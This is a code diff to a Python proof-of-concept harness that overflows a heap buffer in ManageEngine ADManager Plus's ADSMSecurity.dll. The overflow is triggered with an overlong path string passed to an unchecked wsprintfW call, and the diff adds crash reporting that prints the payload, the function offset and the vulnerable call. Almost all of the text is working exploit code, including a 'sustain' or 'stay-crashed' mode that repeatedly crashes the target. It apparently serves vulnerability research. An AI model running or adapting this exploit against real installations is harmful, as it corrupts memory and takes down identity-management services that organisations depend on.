@@ -28,9 +28,37 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 
 DEFAULT_DLL = r"C:\Program Files\ManageEngine\ADManager Plus\lib\native\ADSMSecurity.dll"
 WALK_RVA = 0x7410
+WALK_FUNC_NAME = "sub_0x7410 (ADSMSecurity.dll + 0x7410) - recursive delete-tree walker"
+VULN_CALL = 'wsprintfW( malloc(0x208), "%s\\*.*", path ) at sub_0x7410+0x74a4'
 EXIT_HEAPCORRUPT = 0xC0000374
 EXIT_AV = 0xC0000005
 EXIT_VALIDATE_FALSE = 0xC0000417
+
+def format_payload(path: str, max_show: int = 120) -> str:
+    """Return payload preview for printing - truncated if too long"""
+    if len(path) <= max_show:
+        return path
+    # show start + ... + end with length
+    return f"{path[:60]}...{path[-30:]} [len={len(path)}]"
+
+def print_crash_details(payload_path: str, func_name: str = WALK_FUNC_NAME, extra: str = ""):
+    """Print payload and function name at crash - used by worker and main"""
+    sys.stderr.write("=" * 78 + "\n")
+    sys.stderr.write("[CRASH] PAYLOAD THAT TRIGGERED HEAP CORRUPTION:\n")
+    sys.stderr.write(f"  Function: {func_name}\n")
+    sys.stderr.write(f"  Vulnerable call: {VULN_CALL}\n")
+    sys.stderr.write(f"  Payload length: {len(payload_path)} chars\n")
+    sys.stderr.write(f"  Payload (preview): {format_payload(payload_path)}\n")
+    # full payload in hex-ish safe way - avoid flooding but show if requested
+    if len(payload_path) <= 300:
+        sys.stderr.write(f"  Payload full: {payload_path}\n")
+    else:
+        sys.stderr.write(f"  Payload full (first 200): {payload_path[:200]}\n")
+        sys.stderr.write(f"  Payload full (last 100): ...{payload_path[-100:]}\n")
+    if extra:
+        sys.stderr.write(f"  Extra: {extra}\n")
+    sys.stderr.write("=" * 78 + "\n")
+    sys.stderr.flush()
 
 STATUS_NAMES = {
     0xC0000374: "STATUS_HEAP_CORRUPTION - Windows heap manager detected overflow",
@@ -128,7 +156,11 @@ def simulate_worker(length: int, control: bool, repeat: int, keep_alive: int = 0
             shutil.rmtree(tmp, ignore_errors=True)
         sys.exit(0)
 
+    # Build payload same as real worker for printing
+    payload_path = "C:\\" + "A" * (length - 3) if length >= 4 else "C:\\"
     sys.stderr.write(f"[worker][SIM] OVERFLOW INPUT: path len={length} (nonexistent), repeat={repeat}\n")
+    sys.stderr.write(f"[worker][SIM] PAYLOAD: {format_payload(payload_path)} (len={len(payload_path)})\n")
+    sys.stderr.write(f"[worker][SIM] FUNCTION: {WALK_FUNC_NAME}\n")
     BUFFER_WCHARS = 0x208 // 2
     overflow = length + 5 - BUFFER_WCHARS
 
@@ -136,6 +168,7 @@ def simulate_worker(length: int, control: bool, repeat: int, keep_alive: int = 0
         if overflow > 0:
             if length >= 300 or (length >= 256 and it >= 3):
                 sys.stderr.write(f"[worker][SIM] iteration {it}: HeapValidate DAMAGED - F4 confirmed (overflow {overflow} wchars)\n")
+                print_crash_details(payload_path, WALK_FUNC_NAME, f"iteration {it}, overflow {overflow} wchars, SIM")
                 if keep_alive > 0:
                     sys.stderr.write(f"[worker][SIM] HOLD {keep_alive}s before crash exit (pid={os.getpid()})\n")
                     for r in range(keep_alive, 0, -1):
@@ -145,6 +178,7 @@ def simulate_worker(length: int, control: bool, repeat: int, keep_alive: int = 0
                 sys.exit(EXIT_VALIDATE_FALSE)
             if it == repeat:
                 sys.stderr.write(f"[worker][SIM] iteration {it}: HeapValidate DAMAGED\n")
+                print_crash_details(payload_path, WALK_FUNC_NAME, f"final iteration, overflow {overflow}")
                 if keep_alive > 0:
                     time.sleep(keep_alive)
                 sys.exit(EXIT_HEAPCORRUPT if length >= 261 else EXIT_VALIDATE_FALSE)
@@ -230,6 +264,9 @@ def worker(args):
     assert len(path) == length
     repeat = max(1, args.repeat)
     sys.stderr.write(f"[worker] OVERFLOW len={length} repeat={repeat}\n")
+    sys.stderr.write(f"[worker] PAYLOAD: {format_payload(path)} (len={len(path)})\n")
+    sys.stderr.write(f"[worker] FUNCTION: {WALK_FUNC_NAME}\n")
+    sys.stderr.write(f"[worker] VULN CALL: {VULN_CALL}\n")
 
     fault = ""
     crtheap = None
@@ -283,6 +320,7 @@ def worker(args):
         bad, nh = heaps_damaged()
         if bad:
             sys.stderr.write(f"[worker] iteration {it}: HeapValidate {bad}/{nh} DAMAGED - F4 confirmed\n")
+            print_crash_details(path, WALK_FUNC_NAME, f"iteration {it}, {bad}/{nh} heaps damaged, heap corruption")
             ka = getattr(args, 'keep_alive', 0)
             if ka > 0:
                 sys.stderr.write(f"[worker] HOLD {ka}s before crash exit pid={os.getpid()}\n")
@@ -361,6 +399,7 @@ def sustain(args):
 
     def update_global_status(last_rc=None, last_name=None):
         elapsed = time.time() - start
+        payload_path = "C:\\" + "A" * (length - 3) if length >= 4 else "C:\\"
         status = {
             "timestamp": datetime.datetime.now().isoformat(),
             "pid": os.getpid(),
@@ -368,6 +407,12 @@ def sustain(args):
             "stay_crashed": bool(stay_crashed),
             "mode": "stay-crashed" if stay_crashed else "sustain",
             "dll": args.dll,
+            "function": WALK_FUNC_NAME,
+            "function_rva": f"0x{WALK_RVA:X}",
+            "vulnerable_call": VULN_CALL,
+            "payload": payload_path,
+            "payload_preview": format_payload(payload_path),
+            "payload_len": len(payload_path),
             "path_len": length,
             "keep_alive": keep_alive,
             "uptime_seconds": int(elapsed),
@@ -403,6 +448,11 @@ def sustain(args):
             if is_crash_code(rc):
                 crashes += 1
                 label = STATUS_NAMES.get(rc, STATUS_NAMES.get(rc & 0xFF, "exit %08X" % rc))[:52]
+                # Print payload and function at crash for outside world
+                payload_path = "C:\\" + "A" * (length - 3) if length >= 4 else "C:\\"
+                print(f"    | PAYLOAD: {format_payload(payload_path)} (len={len(payload_path)})")
+                print(f"    | FUNCTION: {WALK_FUNC_NAME}")
+                print(f"    | VULN: {VULN_CALL}")
             else:
                 survived += 1
                 label = "survived - retrying"
@@ -565,6 +615,21 @@ def main():
             print("    | " + line)
         if is_crash_code(rc):
             crashes += 1
+            # Print payload and function name at crash in main too (outside world visible)
+            payload_path = "C:\\" + "A" * (args.length - 3) if not args.control and args.length >= 4 else "(control empty folder)"
+            print("-" * 78)
+            print("[MAIN] CRASH DETECTED - PAYLOAD AND FUNCTION:")
+            print(f"  Function that crashed: {WALK_FUNC_NAME}")
+            print(f"  Vulnerable call: {VULN_CALL}")
+            print(f"  DLL: {args.dll} + 0x{WALK_RVA:X}")
+            print(f"  Payload length: {len(payload_path)} chars")
+            print(f"  Payload preview: {format_payload(payload_path)}")
+            if len(payload_path) <= 500:
+                print(f"  Payload full: {payload_path}")
+            else:
+                print(f"  Payload full (first 200): {payload_path[:200]}")
+                print(f"  Payload full (last 100): ...{payload_path[-100:]}")
+            print("-" * 78)
         if args.attempts > 1 and attempt < args.attempts:
             print("-" * 78)
 
@@ -574,6 +639,10 @@ def main():
     else:
         if crashes:
             print(f"F4 CONFIRMED: {crashes}/{args.attempts} runs heap corruption len={args.length}")
+            # final summary with payload and function
+            payload_path = "C:\\" + "A" * (args.length - 3) if args.length >= 4 else "C:\\"
+            print(f"  Function: {WALK_FUNC_NAME}")
+            print(f"  Payload: {format_payload(payload_path)} (len={len(payload_path)})")
         else:
             print("No corruption this run")
     print("=" * 78)
